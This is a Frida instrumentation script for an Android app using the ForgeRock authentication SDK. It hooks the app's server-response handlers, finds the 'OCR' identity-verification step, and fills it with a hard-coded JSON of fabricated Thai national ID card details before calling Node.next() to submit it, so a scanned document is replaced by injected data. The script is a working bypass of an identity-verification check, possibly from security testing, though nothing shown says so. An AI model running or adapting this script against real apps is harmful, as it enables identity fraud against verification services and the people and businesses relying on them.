// Frida OCR Injection v3 — Server Response Capture
// Hooks AuthServiceClient.onResponse to capture server's reply
// Then fills callbacks and calls Node.next()

Java.perform(function () {
    console.log("[V3] === OCR Injection with Response Capture ===");

    var TextInputCallback = Java.use("org.forgerock.android.auth.callback.TextInputCallback");
    var ChoiceCallback = Java.use("org.forgerock.android.auth.callback.ChoiceCallback");

    var MOCK_JSON = JSON.stringify({
        thaiFirstName: "สมใจ", thaiLastName: "ใจดี",
        englishTitle: "Miss", englishFirstName: "Somjai", englishLastName: "Jaidee",
        citizenId: "3872637115880", dateOfBirth: "15 Jan. 1992",
        dateOfIssue: "21 Aug. 2023", dateOfExpiry: "21 Aug. 2032",
        address: "888 หมู่ที่ 8 ต.ทดสอบ อ.ทดสอบ จ.กรุงเทพฯ"
    });

    // === HOOK 1: Capture AuthServiceClient responses ===
    try {
        var ASC1 = Java.use("org.forgerock.android.auth.AuthServiceClient$1");
        ASC1.onResponse.implementation = function (call, response) {
            console.log("[RESPONSE] *** AuthServiceClient.onResponse fired! ***");
            try {
                var code = response.code();
                console.log("[RESPONSE] HTTP code: " + code);
                var body = response.peekBody(1048576).string();
                console.log("[RESPONSE] Body (first 300): " + body.substring(0, 300));
                // Check for stage
                if (body.indexOf("stage") >= 0) {
                    var stageMatch = body.match(/"stage"\s*:\s*"([^"]+)"/);
                    if (stageMatch) console.log("[RESPONSE] *** Stage: " + stageMatch[1] + " ***");
                }
                // Check for error
                if (body.indexOf("error") >= 0) {
                    console.log("[RESPONSE] *** Error detected in response ***");
                }
            } catch (e) {
                console.log("[RESPONSE] Body read error: " + e);
            }
            return this.onResponse(call, response);
        };
        console.log("[V3] Hooked AuthServiceClient$1.onResponse");
    } catch (e) { console.log("[V3] Hook ASC1 failed: " + e); }

    try {
        var ASC2 = Java.use("org.forgerock.android.auth.AuthServiceClient$2");
        ASC2.onResponse.implementation = function (call, response) {
            console.log("[RESPONSE] *** AuthServiceClient$2.onResponse fired! ***");
            try {
                var body = response.peekBody(1048576).string();
                console.log("[RESPONSE] Body (first 300): " + body.substring(0, 300));
            } catch (e) {}
            return this.onResponse(call, response);
        };
        console.log("[V3] Hooked AuthServiceClient$2.onResponse");
    } catch (e) { console.log("[V3] Hook ASC2 failed: " + e); }

    // === HOOK 2: Capture NodeListener callback (if it fires) ===
    try {
        var NodeListener = Java.use("org.forgerock.android.auth.NodeListener");
        // Can't hook interface methods directly, but can hook implementations
    } catch (e) {}

    // === MAIN: Find Node, fill, submit ===
    var foundNode = false;
    Java.choose("org.forgerock.android.auth.Node", {
        onMatch: function (node) {
            if (foundNode) return;
            try {
                if (node.getStage() !== "OCR") return;
                foundNode = true;
                console.log("[V3] *** OCR Node found ***");

                // Fill callbacks
                var callbacks = node.getCallbacks();
                for (var i = 0; i < callbacks.size(); i++) {
                    var cb = callbacks.get(i);
                    if (cb.$className === "org.forgerock.android.auth.callback.TextInputCallback") {
                        Java.cast(cb, TextInputCallback).setValue(MOCK_JSON);
                        console.log("[V3] Set TextInputCallback (JSON, len=" + MOCK_JSON.length + ")");
                    }
                    if (cb.$className === "org.forgerock.android.auth.callback.ChoiceCallback") {
                        Java.cast(cb, ChoiceCallback).setSelectedIndex(0);
                        console.log("[V3] Set ChoiceCallback (proceed)");
                    }
                }

                // Get context + find listener
                var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
                var listener = null;
                Java.choose("org.forgerock.android.auth.NodeListener", {
                    onMatch: function (l) { if (!listener) { listener = l; console.log("[V3] Found listener"); } },
                    onComplete: function () {}
                });

                // Submit
                console.log("[V3] *** Calling Node.next() with listener=" + (listener ? "found" : "null") + " ***");
                try {
                    node.next(context, listener);
                    console.log("[V3] *** Node.next() completed ***");
                    console.log("[V3] Waiting for server response...");
                } catch (e) {
                    console.log("[V3] Node.next() error: " + e);
                }

                // Also hook onFailure
                try {
                    var ASC1Fail = Java.use("org.forgerock.android.auth.AuthServiceClient$1");
                    ASC1Fail.onFailure.implementation = function (call, e) {
                        console.log("[RESPONSE] *** onFailure: " + e + " ***");
                        return this.onFailure(call, e);
                    };
                } catch (e) {}

            } catch (e) {
                console.log("[V3] Error: " + e);
            }
        },
        onComplete: function () {
            if (!foundNode) console.log("[V3] No OCR Node found");
            console.log("[V3-COMPLETE] Done");
        }
    });
});
